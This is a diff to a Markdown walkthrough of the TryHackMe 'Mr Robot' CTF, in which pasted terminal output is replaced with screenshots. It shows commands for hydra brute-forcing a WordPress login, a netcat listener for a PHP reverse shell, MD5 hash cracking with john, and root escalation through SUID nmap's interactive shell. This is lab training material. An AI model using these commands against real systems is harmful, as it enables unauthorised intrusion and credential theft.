@@ -1,3 +1,5 @@
+![MrRobotTryHackMe](https://github.com/user-attachments/assets/7665aca6-c98c-4f00-9e7a-f6bfbdbce1ae)
+
 ## Challenge Infomation
 Challenge Name: Mr Robot CTF 
 
@@ -32,18 +34,8 @@ command: `nmap 10.10.159.27`
 **Findings:**
 
 Found that services like `ssh` `http` `https` at port `22` `80` `443` respectively
-```
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 19:17 IST
-Nmap scan report for 10.10.159.27
-Host is up (0.16s latency).
-Not shown: 997 filtered tcp ports (no-response)
-PORT    STATE  SERVICE
-22/tcp  closed ssh
-80/tcp  open   http
-443/tcp open   https
 
-Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds
-```
+![NmapResult](https://github.com/user-attachments/assets/2e2f069a-285c-4e3d-bed9-16e984942f3d)
 
 ### Step 1.2: Detailed Service Enumeration
 
@@ -93,54 +85,7 @@ function
 
 Command: `gobuster dir -u 10.10.159.27 -w /usr/share/seclists/Discovery/Web-Content/common.txt -q -o gobuster-common.txt`
 
-```
-/.hta                 (Status: 403) [Size: 213]
-/.htaccess            (Status: 403) [Size: 218]
-/.htpasswd            (Status: 403) [Size: 218]
-/0                    (Status: 301) [Size: 0] [--> http://10.10.159.27/0/]
-/Image                (Status: 301) [Size: 0] [--> http://10.10.159.27/Image/]
-/admin                (Status: 301) [Size: 234] [--> http://10.10.159.27/admin/]
-/atom                 (Status: 301) [Size: 0] [--> http://10.10.159.27/feed/atom/]
-/audio                (Status: 301) [Size: 234] [--> http://10.10.159.27/audio/]
-/blog                 (Status: 301) [Size: 233] [--> http://10.10.159.27/blog/]
-/css                  (Status: 301) [Size: 232] [--> http://10.10.159.27/css/]
-/dashboard            (Status: 302) [Size: 0] [--> http://10.10.159.27/wp-admin/]
-/favicon.ico          (Status: 200) [Size: 0]
-/feed                 (Status: 301) [Size: 0] [--> http://10.10.159.27/feed/]
-/image                (Status: 301) [Size: 0] [--> http://10.10.159.27/image/]
-/images               (Status: 301) [Size: 235] [--> http://10.10.159.27/images/]
-/index.html           (Status: 200) [Size: 1188]
-/index.php            (Status: 301) [Size: 0] [--> http://10.10.159.27/]
-/js                   (Status: 301) [Size: 231] [--> http://10.10.159.27/js/]
-/license              (Status: 200) [Size: 309]
-/intro                (Status: 200) [Size: 516314]
-/login                (Status: 302) [Size: 0] [--> http://10.10.159.27/wp-login.php]
-/page1                (Status: 301) [Size: 0] [--> http://10.10.159.27/]
-/phpmyadmin           (Status: 403) [Size: 94]
-/rdf                  (Status: 301) [Size: 0] [--> http://10.10.159.27/feed/rdf/]
-/readme               (Status: 200) [Size: 64]
-/render/https://www.google.com (Status: 301) [Size: 0] [--> http://10.10.159.27/render/https:/www.google.com]
-/robots               (Status: 200) [Size: 41]
-/robots.txt           (Status: 200) [Size: 41]
-/rss                  (Status: 301) [Size: 0] [--> http://10.10.159.27/feed/]
-/rss2                 (Status: 301) [Size: 0] [--> http://10.10.159.27/feed/]
-/sitemap              (Status: 200) [Size: 0]
-/sitemap.xml          (Status: 200) [Size: 0]
-/video                (Status: 301) [Size: 234] [--> http://10.10.159.27/video/]
-/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.159.27/wp-admin/]
-/wp-content           (Status: 301) [Size: 239] [--> http://10.10.159.27/wp-content/]
-/wp-config            (Status: 200) [Size: 0]
-/wp-cron              (Status: 200) [Size: 0]
-/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.159.27/wp-includes/]
-/wp-load              (Status: 200) [Size: 0]
-/wp-links-opml        (Status: 200) [Size: 227]
-/wp-login             (Status: 200) [Size: 2606]
-/wp-settings          (Status: 500) [Size: 0]
-/wp-mail              (Status: 500) [Size: 3064]
-/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.159.27/wp-login.php?action=register]
-/xmlrpc.php           (Status: 405) [Size: 42]
-/xmlrpc               (Status: 405) [Size: 42]
-```
+![GoBusterResult](https://github.com/user-attachments/assets/851e5190-6019-497d-8ff9-2c2f8b0d8ca1)
 
 **Findings:** Discovered `/wp-login` directory.
 
@@ -151,39 +96,8 @@ I found that it is a wordpress website and using the `fsocity.dic` dictionary i 
 I'm using **Burp Suite** to capture login request in the `/wp-login` page using a failed login. 
 
 **findings:**
-```
-POST /wp-login.php HTTP/1.1
 
-Host: 10.10.159.27
-
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-
-Accept-Language: en-US,en;q=0.5
-
-Accept-Encoding: gzip, deflate, br
-
-Content-Type: application/x-www-form-urlencoded
-
-Content-Length: 101
-
-Origin: http://10.10.159.27
-
-DNT: 1
-
-Connection: keep-alive
-
-Referer: http://10.10.159.27/wp-login
-
-Cookie: s_cc=true; s_fid=4762DBD7DCB086A6-28E527B0D5C8FF4A; s_nr=1722867205385; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
-
-Upgrade-Insecure-Requests: 1
-
-
-
-log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.159.27%2Fwp-admin%2F&testcookie=1
-```
+![BurpSuiteResult](https://github.com/user-attachments/assets/e58fd0bf-b695-4022-82cf-4650677fbbdb)
 
 I need only the following line in the result for the acutal Brute Force.
 
@@ -206,14 +120,8 @@ To start the brute force im using `fsocity.dic` for username and a static passwo
 **command:** `hydra -L fsocity.dic -p test 10.10.159.27 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30`
 
 **Findings:**
-```
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-05 20:11:36
-[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:858235/p:1), ~28608 tries per task
-[DATA] attacking http-post-form://10.10.159.27:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
-[80][http-post-form] host: 10.10.159.27   login: Elliot   password: test
-```
+![HydraUsername](https://github.com/user-attachments/assets/10d35303-c96b-451a-8786-5a735de75475)
 
 Now from the result i know that `Elliot` is the username of the login page.
 
@@ -241,6 +149,8 @@ To get a connection from the target machine i started a listener at port `53`
 
 **command:** `rlwrap nc -lvnp 53`
 
+![nc](https://github.com/user-attachments/assets/06203a18-8c9a-4678-9be3-6662dc026169)
+
 I'm using `rlwrap` because it allows me to edit the upcoming connections.
 
 while netcat is watiing for the connection to estabilish i'm sourcing PHP Reverse Shell Script from a github repository called pentestmonkey.
@@ -252,38 +162,19 @@ To establish a connection with `netcat` im firing up `archive.php` site `http://
 
 once i started the site, at my terminal my listener had estabished a connection to the server
 
-```
-┌──(kali㉿kali)-[~/AJOY]
-└─$ rlwrap nc -lvnp 53 
-listening on [any] 53 ...
-connect to [10.17.105.111] from (UNKNOWN) [10.10.159.27] 38786
-Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
- 15:18:06 up  1:44,  0 users,  load average: 0.08, 0.08, 0.46
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
-/bin/sh: 0: can't access tty; job control turned off
-$
-```
+![rlwrap](https://github.com/user-attachments/assets/4402b628-e7ab-4a84-86c3-9ff835f545a0)
 
 After getting access to the target machine i browers thourgh the folders and found two entires `key-2-of-3.txt` and `password.raw-md5` 
 
 i found the next `key` inside `/robot/key-2-of-3.txt`, but when tried to open `key-2-of-3.txt` using `cat` command i was denied from it.
 
 To check why this happend, i used `ls -lsa` to check in which user the file is accessiable, and found it was under a user named robot
-```
-$ ls -lsa
-total 16
-4 drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
-4 drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-4 -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-4 -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
-```
+
+![ls -lsa](https://github.com/user-attachments/assets/35d407ab-0077-449d-bccb-b6040be94f3f)
 
 but i found `robot:c3fcd3d76192e4007dfb496cca67e13b` inside `password.raw-md5` which was some kind of password for `robot` user in `RAW-MD5` hash.
-```
-$ cat password.raw-md5
-robot:c3fcd3d76192e4007dfb496cca67e13b
-```
+
+![pasword raw-md5](https://github.com/user-attachments/assets/5cbf1b30-cb92-4c0e-b3b6-adb6648a0827)
 
 Now to crack this hash i used a password cracking package call `john` or also know as `john the ripper` to crack the `RAW-MD5` hash.
 
@@ -292,14 +183,8 @@ Now to crack this hash i used a password cracking package call `john` or also kn
 **Command:** `john md5.hash --wordlist=fsocity.dic --format=RAW-MD5`
 
 **Findings:**
-```
-Using default input encoding: UTF-8
-Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
-Warning: no OpenMP support for this hash type, consider --fork=12
-Press 'q' or Ctrl-C to abort, almost any other key for status
-0g 0:00:00:00 DONE (2024-08-05 20:59) 0g/s 4516Kp/s 4516Kc/s 4516KC/s 8output..ABCDEFGHIJKLMNOPQRSTUVWXYZ
-Session completed. 
-```
+
+![johntheripper](https://github.com/user-attachments/assets/5d39ca11-a27d-45e0-a8f8-d8b828126d87)
 
 So i found that the password inside the `RAW-MD5` hash was `abcdefghijklmnopqrstuvwxyz`
 
@@ -344,33 +229,7 @@ To find the root user i'm searching for binary bin in order to spawn a shell
 
 **command:** `find / -perm +6000 2>/dev/null | grep '/bin/'`
 
-```
-robot@linux:~$ find / -perm +6000 2>/dev/null | grep '/bin/'
-find / -perm +6000 2>/dev/null | grep '/bin/'
-/bin/ping
-/bin/umount
-/bin/mount
-/bin/ping6
-/bin/su
-/usr/bin/mail-touchlock
-/usr/bin/passwd
-/usr/bin/newgrp
-/usr/bin/screen
-/usr/bin/mail-unlock
-/usr/bin/mail-lock
-/usr/bin/chsh
-/usr/bin/crontab
-/usr/bin/chfn
-/usr/bin/chage
-/usr/bin/gpasswd
-/usr/bin/expiry
-/usr/bin/dotlockfile
-/usr/bin/sudo
-/usr/bin/ssh-agent
-/usr/bin/wall
-/usr/local/bin/nmap
-
-```
+![binarybin](https://github.com/user-attachments/assets/e83319ee-ff47-4319-a75f-a8a187ac1206)
 
 ### Step 5.2:
 
@@ -380,17 +239,7 @@ To excute it im using `nmap` interactive method
 
 **command:** `/usr/local/bin/nmap --interactive`
 
-```
-/usr/local/bin/nmap --interactive 
-
-Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
-Welcome to Interactive Mode -- press h <enter> for help
-nmap> !sh
-!sh
-# whoami
-whoami
-root
-```
+![root access](https://github.com/user-attachments/assets/ebaee7c9-78b4-470d-95f9-c7c41339b5d9)
 
 I found the final key `key-3-of-3` under `/root/key-3-of-3.txt`
 
